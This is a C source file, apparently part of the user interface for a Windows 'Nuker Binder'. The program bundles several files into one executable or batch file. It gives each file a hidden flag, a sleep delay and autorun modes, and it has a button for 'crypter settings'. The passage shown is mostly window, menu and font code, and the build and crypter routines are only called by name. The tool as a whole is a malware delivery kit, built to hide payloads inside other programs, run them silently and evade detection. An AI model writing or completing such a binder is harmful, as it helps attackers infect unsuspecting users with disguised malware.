    NUkerLblTotal = CreateWindowExA(0, "STATIC", "FILES: 0 | TOTAL: 0 B", WS_CHILD | WS_VISIBLE | SS_LEFT, 465, NUkerRowY + 4, 250, 14, NUkerWnd, (HMENU)NUKER_ID_LBL_TOTALSIZE, NUkerAppInstance, NULL);
    SendMessageA(NUkerLblTotal, WM_SETFONT, (WPARAM)NUkerFontMono, TRUE);
    HWND NUkerIconLbl = CreateWindowExA(0, "STATIC", "ICON: (NONE)", WS_CHILD | WS_VISIBLE | SS_LEFT, 465, NUkerRowY + 20, 250, 14, NUkerWnd, (HMENU)NUKER_ID_LBL_ICON, NUkerAppInstance, NULL);
    SendMessageA(NUkerIconLbl, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE); NUkerRowY += 55;
    NUkerProgressBar = CreateWindowExA(0, PROGRESS_CLASSA, NULL, WS_CHILD | WS_VISIBLE | PBS_SMOOTH, 0, NUKER_WINDOW_H - 24, NUKER_WINDOW_W, 4, NUkerWnd, (HMENU)NUKER_ID_PROGRESS, NUkerAppInstance, NULL);
    SendMessageA(NUkerProgressBar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
    NUkerStatusBar = CreateWindowExA(0, STATUSCLASSNAMEA, "(c) 2026 NukerGroup Engineering Division", WS_CHILD | WS_VISIBLE, 0, 0, 0, 0, NUkerWnd, (HMENU)NUKER_ID_STATUSBAR, NUkerAppInstance, NULL);
    SendMessageA(NUkerStatusBar, WM_SETFONT, (WPARAM)NUkerFontNormal, TRUE);
}

void NUkerInitFonts(void)
{
    NUkerFontNormal = CreateFontA(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Segoe UI");
    NUkerFontBold = CreateFontA(14, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Segoe UI");
    NUkerFontMono = CreateFontA(13, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, FIXED_PITCH | FF_MODERN, "Consolas");
}

void NUkerInitBrushes(void) { NUkerBrushBg = CreateSolidBrush(NUKER_CLR_BG); NUkerBrushListBg = CreateSolidBrush(NUKER_CLR_LISTBG); NUkerBrushBtn = CreateSolidBrush(NUKER_CLR_BTN); NUkerBrushTitleBar = CreateSolidBrush(NUKER_CLR_TITLEBAR); }

void NUkerCleanup(void) { DeleteObject(NUkerFontNormal); DeleteObject(NUkerFontBold); DeleteObject(NUkerFontMono); DeleteObject(NUkerBrushBg); DeleteObject(NUkerBrushListBg); DeleteObject(NUkerBrushBtn); DeleteObject(NUkerBrushTitleBar); }

void NUkerHandleContextMenu(HWND NUkerHwnd)
{
    int NUkerSel = (int)SendMessageA(NUkerListView, LVM_GETNEXTITEM, -1, LVNI_SELECTED);
    HMENU NUkerPopup = CreatePopupMenu();
    AppendMenuA(NUkerPopup, MF_STRING, NUKER_CTX_ADD_FILES, "  Add Files...");
    AppendMenuA(NUkerPopup, MF_SEPARATOR, 0, NULL);
    if (NUkerSel >= 0 && NUkerSel < NUkerFileCount) {
        AppendMenuA(NUkerPopup, MF_STRING, NUKER_CTX_REMOVE, "  Remove");
        AppendMenuA(NUkerPopup, MF_STRING, NUKER_CTX_MOVEUP, "  Move Up");
        AppendMenuA(NUkerPopup, MF_STRING, NUKER_CTX_MOVEDOWN, "  Move Down");
        AppendMenuA(NUkerPopup, MF_SEPARATOR, 0, NULL);
        AppendMenuA(NUkerPopup, MF_STRING | ((NUkerFileList[NUkerSel].NUkerExecMode == NUKER_EXEC_RUNNING) ? MF_CHECKED : 0), NUKER_CTX_EXEC_RUNNING, "     Running");
        AppendMenuA(NUkerPopup, MF_STRING | ((NUkerFileList[NUkerSel].NUkerExecMode == NUKER_EXEC_RUNONCE) ? MF_CHECKED : 0), NUKER_CTX_EXEC_RUNONCE, "     Runonce");
        AppendMenuA(NUkerPopup, MF_STRING | ((NUkerFileList[NUkerSel].NUkerExecMode == NUKER_EXEC_NORUN) ? MF_CHECKED : 0), NUKER_CTX_EXEC_NORUN, "     No Run");
        AppendMenuA(NUkerPopup, MF_SEPARATOR, 0, NULL);
        AppendMenuA(NUkerPopup, MF_STRING | (NUkerFileList[NUkerSel].NUkerHidden ? MF_CHECKED : 0), NUKER_CTX_HIDDEN_ON, "  Hidden");
        AppendMenuA(NUkerPopup, MF_STRING, NUKER_CTX_SLEEP, "  Sleep...");
        AppendMenuA(NUkerPopup, MF_STRING, NUKER_CTX_RESET, "  Reset to Default");
    }
    AppendMenuA(NUkerPopup, MF_SEPARATOR, 0, NULL);
    AppendMenuA(NUkerPopup, MF_STRING, NUKER_CTX_CLEAR, "  Clear All");
    AppendMenuA(NUkerPopup, MF_STRING, NUKER_CTX_ABOUT, "  About Nuker Binder");
    POINT Pt; GetCursorPos(&Pt);
    int Cmd = TrackPopupMenu(NUkerPopup, TPM_RETURNCMD | TPM_RIGHTBUTTON, Pt.x, Pt.y, 0, NUkerHwnd, NULL);
    DestroyMenu(NUkerPopup);
    if (Cmd == NUKER_CTX_ADD_FILES) {
        OPENFILENAMEA Ofn = {0}; char Buf[4096] = {0}; Ofn.lStructSize = sizeof(Ofn); Ofn.hwndOwner = NUkerMainWindow;
        Ofn.lpstrFilter = "All Files (*.*)\0*.*\0"; Ofn.lpstrFile = Buf; Ofn.nMaxFile = 4096; Ofn.Flags = OFN_ALLOWMULTISELECT | OFN_EXPLORER | OFN_FILEMUSTEXIST;
        if (GetOpenFileNameA(&Ofn)) {
            char *p = Buf + strlen(Buf) + 1;
            if (*p == '\0') {
                if (NUkerFileCount < NUKER_MAX_FILES && !NUkerCheckDuplicate(Buf)) {
                    _snprintf(NUkerFileList[NUkerFileCount].NUkerPath, NUKER_MAX_FILEPATH-1, "%s", Buf);
                    NUkerExtractFileName(Buf, NUkerFileList[NUkerFileCount].NUkerName, 260);
                    HANDLE h = CreateFileA(Buf, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                    NUkerFileList[NUkerFileCount].NUkerSize = GetFileSize(h, NULL); CloseHandle(h);
                    NUkerFileList[NUkerFileCount].NUkerExecMode = NUKER_EXEC_RUNNING; NUkerFileCount++;
                }
            } else {
                char Dir[MAX_PATH]; strcpy(Dir, Buf);
                while (*p) {
                    char Full[MAX_PATH]; _snprintf(Full, MAX_PATH-1, "%s\\%s", Dir, p);
                    if (NUkerFileCount < NUKER_MAX_FILES && !NUkerCheckDuplicate(Full)) {
                        strcpy(NUkerFileList[NUkerFileCount].NUkerPath, Full);
                        NUkerExtractFileName(Full, NUkerFileList[NUkerFileCount].NUkerName, 260);
                        HANDLE h = CreateFileA(Full, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                        NUkerFileList[NUkerFileCount].NUkerSize = GetFileSize(h, NULL); CloseHandle(h);
                        NUkerFileList[NUkerFileCount].NUkerExecMode = NUKER_EXEC_RUNNING; NUkerFileCount++;
                    }
                    p += strlen(p) + 1;
                }
            }
            NUkerRefreshListView();
        }
    }
    else if (Cmd == NUKER_CTX_REMOVE && NUkerSel >= 0) { for(int i=NUkerSel; i<NUkerFileCount-1; i++) NUkerFileList[i] = NUkerFileList[i+1]; NUkerFileCount--; NUkerRefreshListView(); }
    else if (Cmd == NUKER_CTX_CLEAR) { NUkerFileCount = 0; NUkerRefreshListView(); }
    else if (Cmd == NUKER_CTX_ABOUT) MessageBoxA(NUkerHwnd, NUkerCopyright, "Nuker Binder", MB_ICONINFORMATION);
}

LRESULT CALLBACK NUkerWndProc(HWND NUkerHwnd, UINT NUkerMsg, WPARAM NUkerWp, LPARAM NUkerLp)
{
    switch (NUkerMsg) {
    case WM_CREATE: NUkerCreateControls(NUkerHwnd); DragAcceptFiles(NUkerHwnd, TRUE); return 0;
    case WM_PAINT: { PAINTSTRUCT Ps; HDC Dc = BeginPaint(NUkerHwnd, &Ps); RECT R; GetClientRect(NUkerHwnd, &R); NUkerDrawTitleBar(Dc, &R); EndPaint(NUkerHwnd, &Ps); return 0; }
    case WM_LBUTTONDOWN: {
        int X = (short)LOWORD(NUkerLp), Y = (short)HIWORD(NUkerLp); RECT R; GetClientRect(NUkerHwnd, &R);
        if (Y < NUKER_TITLEBAR_H) {
            if (X >= R.right - 45) { if (NUkerOperationActive) return 0; DestroyWindow(NUkerHwnd); return 0; }
            if (X >= R.right - 90) { ShowWindow(NUkerHwnd, SW_MINIMIZE); return 0; }
            NUkerDraggingTitle = TRUE; NUkerDragStart.x = X; NUkerDragStart.y = Y; SetCapture(NUkerHwnd);
        } return 0;
    }
    case WM_MOUSEMOVE: {
        int Hov = 0, X = (short)LOWORD(NUkerLp), Y = (short)HIWORD(NUkerLp); RECT R; GetClientRect(NUkerHwnd, &R);
        if (NUkerDraggingTitle) { RECT Wr; GetWindowRect(NUkerHwnd, &Wr); MoveWindow(NUkerHwnd, Wr.left + X - NUkerDragStart.x, Wr.top + Y - NUkerDragStart.y, Wr.right - Wr.left, Wr.bottom - Wr.top, TRUE); return 0; }
        if (Y >= 0 && Y < NUKER_TITLEBAR_H) { if (X >= R.right - 45) Hov = 2; else if (X >= R.right - 90) Hov = 1; }
        if (Hov != NUkerHoverCloseBtn) { NUkerHoverCloseBtn = Hov; RECT Inv = {R.right - 90, 0, R.right, NUKER_TITLEBAR_H}; InvalidateRect(NUkerHwnd, &Inv, FALSE); }
        TRACKMOUSEEVENT Tme = {sizeof(Tme), TME_LEAVE, NUkerHwnd, 0}; TrackMouseEvent(&Tme); return 0;
    }
    case WM_MOUSELEAVE: if (NUkerHoverCloseBtn != 0) { NUkerHoverCloseBtn = 0; RECT R; GetClientRect(NUkerHwnd, &R); RECT Inv = {R.right - 90, 0, R.right, NUKER_TITLEBAR_H}; InvalidateRect(NUkerHwnd, &Inv, FALSE); } return 0;
    case WM_LBUTTONUP: if (NUkerDraggingTitle) { NUkerDraggingTitle = FALSE; ReleaseCapture(); } return 0;
    case WM_CTLCOLORSTATIC: case WM_CTLCOLORBTN: { HDC Dc = (HDC)NUkerWp; SetTextColor(Dc, NUKER_CLR_TEXT); SetBkMode(Dc, TRANSPARENT); return (LRESULT)NUkerBrushBg; }
    case WM_CTLCOLOREDIT: { HDC Dc = (HDC)NUkerWp; SetTextColor(Dc, NUKER_CLR_TEXT); SetBkColor(Dc, NUKER_CLR_LISTBG); return (LRESULT)NUkerBrushListBg; }
    case WM_ERASEBKGND: { RECT R; GetClientRect(NUkerHwnd, &R); R.top += NUKER_TITLEBAR_H; FillRect((HDC)NUkerWp, &R, NUkerBrushBg); return 1; }
    case WM_NOTIFY: { NMHDR *Nm = (NMHDR *)NUkerLp; if (Nm->idFrom == NUKER_ID_LV && Nm->code == NM_RCLICK) { NUkerHandleContextMenu(NUkerHwnd); return 0; } break; }
    case WM_COMMAND: { int Id = LOWORD(NUkerWp); if (Id == NUKER_ID_BTN_BUILDEXE) NUkerBuildExe(); else if (Id == NUKER_ID_BTN_BUILDBAT) NUkerBuildBat(); else if (Id == NUKER_ID_BTN_ICON) NUkerSelectIconSource(); else if (Id == NUKER_ID_BTN_CRYPTER) NUkerShowCrypterSettings(); break; }
    case WM_GETMINMAXINFO: { MINMAXINFO *M = (MINMAXINFO *)NUkerLp; M->ptMinTrackSize.x = NUKER_WINDOW_W; M->ptMinTrackSize.y = NUKER_WINDOW_H; M->ptMaxTrackSize.x = NUKER_WINDOW_W; M->ptMaxTrackSize.y = NUKER_WINDOW_H; return 0; }
    case WM_CLOSE: if (NUkerOperationActive) return 0; DestroyWindow(NUkerHwnd); return 0;
    case WM_DESTROY: NUkerCleanup(); PostQuitMessage(0); return 0;
    }
    return DefWindowProcA(NUkerHwnd, NUkerMsg, NUkerWp, NUkerLp);
}

int WINAPI WinMain(HINSTANCE NUkerInst, HINSTANCE NUkerPrev, LPSTR NUkerCmdLine, int NUkerShow)
{
    NUkerAppInstance = NUkerInst;
    INITCOMMONCONTROLSEX Icc = {sizeof(Icc), ICC_LISTVIEW_CLASSES | ICC_PROGRESS_CLASS | ICC_BAR_CLASSES};
    InitCommonControlsEx(&Icc); OleInitialize(NULL); NUkerInitFonts(); NUkerInitBrushes();
    WNDCLASSEXA Wc = {0}; Wc.cbSize = sizeof(Wc); Wc.style = CS_HREDRAW | CS_VREDRAW; Wc.lpfnWndProc = NUkerWndProc; Wc.hInstance = NUkerInst; Wc.hCursor = LoadCursor(NULL, IDC_ARROW); Wc.hbrBackground = NUkerBrushBg; Wc.lpszClassName = "NUkerBinderClass"; Wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    if (!RegisterClassExA(&Wc)) return 1;
    int Sw = GetSystemMetrics(SM_CXSCREEN), Sh = GetSystemMetrics(SM_CYSCREEN);
    NUkerMainWindow = CreateWindowExA(WS_EX_ACCEPTFILES, "NUkerBinderClass", "", WS_POPUP | WS_VISIBLE | WS_MINIMIZEBOX, (Sw - NUKER_WINDOW_W) / 2, (Sh - NUKER_WINDOW_H) / 2, NUKER_WINDOW_W, NUKER_WINDOW_H, NULL, NULL, NUkerInst, NULL);
    ShowWindow(NUkerMainWindow, NUkerShow); UpdateWindow(NUkerMainWindow);
    MSG Msg; while (GetMessageA(&Msg, NULL, 0, 0) > 0) { TranslateMessage(&Msg); DispatchMessageA(&Msg); }
    OleUninitialize(); return (int)Msg.wParam;
}
